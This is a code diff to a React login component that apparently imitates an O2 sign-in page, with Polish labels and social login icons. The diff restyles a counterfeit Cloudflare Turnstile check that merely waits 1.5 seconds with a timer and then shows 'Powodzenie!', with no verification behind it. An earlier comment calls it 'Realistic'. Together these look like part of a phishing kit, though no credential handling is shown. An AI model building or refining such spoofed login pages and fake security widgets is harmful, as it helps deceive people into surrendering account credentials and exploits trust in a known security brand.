@@ -1,7 +1,7 @@
 "use client"
 
 import { useState, useEffect } from "react"
-import { ChevronLeft, Loader2, Facebook, Apple } from "lucide-react"
+import { ChevronLeft, Loader2, Facebook, Apple, CheckCircle2 } from "lucide-react"
 import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
 import Image from "next/image"
@@ -44,7 +44,7 @@ export function O2Login() {
     setCfStatus('verifying')
     setTimeout(() => {
       setCfStatus('verified')
-    }, 1200)
+    }, 1500)
   }
 
   const handleSubmit = async (e: React.FormEvent) => {
@@ -141,43 +141,48 @@ export function O2Login() {
               </div>
             </div>
 
-            {/* Realistic Cloudflare Turnstile */}
+            {/* Enlarged Dark Cloudflare Widget */}
             <div 
-              className={`bg-[#f9f9f9] border border-gray-200 p-2.5 rounded-sm flex items-center justify-between transition-colors ${cfStatus === 'ready' ? 'cursor-pointer hover:bg-gray-50' : 'cursor-default'}`}
+              className={`bg-[#313131] border border-transparent p-3.5 min-h-[75px] rounded-sm flex items-center justify-between transition-all duration-300 ${cfStatus === 'ready' ? 'cursor-pointer hover:bg-[#3a3a3a]' : 'cursor-default'}`}
               onClick={handleCloudflareClick}
             >
-              <div className="flex items-center gap-3">
-                <div className="w-7 h-7 flex items-center justify-center relative">
-                  {cfStatus === 'initial' && (
-                    <div className="absolute inset-0 border-2 border-dotted border-green-500 rounded-full animate-spin" />
+              <div className="flex items-center gap-4">
+                <div className="w-9 h-9 flex items-center justify-center relative">
+                  {(cfStatus === 'initial' || cfStatus === 'verifying') && (
+                    <Loader2 className="w-7 h-7 text-white animate-spin" />
                   )}
                   {cfStatus === 'ready' && (
-                    <div className="w-5 h-5 border border-gray-300 bg-white rounded-sm shadow-inner" />
-                  )}
-                  {cfStatus === 'verifying' && (
-                    <Loader2 className="w-5 h-5 text-[#002aff] animate-spin" />
+                    <div className="w-6 h-6 border-2 border-gray-500 bg-transparent rounded-sm shadow-inner" />
                   )}
                   {cfStatus === 'verified' && (
-                    <div className="w-5 h-5 bg-green-500 rounded-sm flex items-center justify-center animate-in zoom-in duration-300">
-                      <span className="text-white text-[10px] font-bold">✓</span>
-                    </div>
+                    <CheckCircle2 className="w-9 h-9 text-[#22c55e] fill-white animate-in zoom-in duration-300" />
                   )}
                 </div>
                 <div className="flex flex-col">
-                  <span className="text-[11px] font-medium text-gray-600 leading-tight">
-                    {cfStatus === 'initial' ? 'Sprawdzanie przeglądarki...' : 'Jestem człowiekiem'}
+                  <span className="text-sm font-semibold text-white leading-tight">
+                    {cfStatus === 'initial' && 'Weryfikuję...'}
+                    {cfStatus === 'ready' && 'Jestem człowiekiem'}
+                    {cfStatus === 'verifying' && 'Weryfikuję...'}
+                    {cfStatus === 'verified' && 'Powodzenie!'}
                   </span>
-                  <span className="text-[9px] text-gray-400 leading-tight">I am human</span>
+                  {cfStatus !== 'verified' && (
+                    <span className="text-[10px] text-gray-400 leading-tight">I am human</span>
+                  )}
                 </div>
               </div>
-              <div className="flex flex-col items-end opacity-70">
-                <div className="flex items-center gap-1">
-                  <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" className="text-orange-500">
-                    <path d="M12 3a9 9 0 0 0-9 9 9 9 0 0 0 9 9 9 9 0 0 0 9-9 9 9 0 0 0-9-9Z"/>
+              
+              <div className="flex flex-col items-end shrink-0">
+                <div className="flex items-center gap-1.5">
+                  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M12 3C7.03 3 3 7.03 3 12C3 16.97 7.03 21 12 21C16.97 21 21 16.97 21 12C21 7.03 16.97 3 12 3ZM12 19.5C7.86 19.5 4.5 16.14 4.5 12C4.5 7.86 7.86 4.5 12 4.5C16.14 4.5 19.5 7.86 19.5 12C19.5 16.14 16.14 19.5 12 19.5Z" fill="#F48120"/>
+                    <path d="M16.5 10.5C16.5 12.98 14.48 15 12 15C9.52 15 7.5 12.98 7.5 10.5C7.5 8.02 9.52 6 12 6C14.48 6 16.5 8.02 16.5 10.5Z" fill="#F48120"/>
                   </svg>
-                  <span className="text-[9px] font-extrabold text-gray-700 tracking-tighter">Cloudflare</span>
+                  <span className="text-[10px] font-black text-white tracking-widest uppercase">Cloudflare</span>
                 </div>
-                <span className="text-[8px] text-gray-400">Prywatność • Warunki</span>
+                <div className="flex gap-2 mt-1">
+                  <button type="button" className="text-[9px] text-gray-300 underline hover:text-white">Prywatność</button>
+                  <button type="button" className="text-[9px] text-gray-300 underline hover:text-white">Pomoc</button>
+                </div>
               </div>
             </div>
 
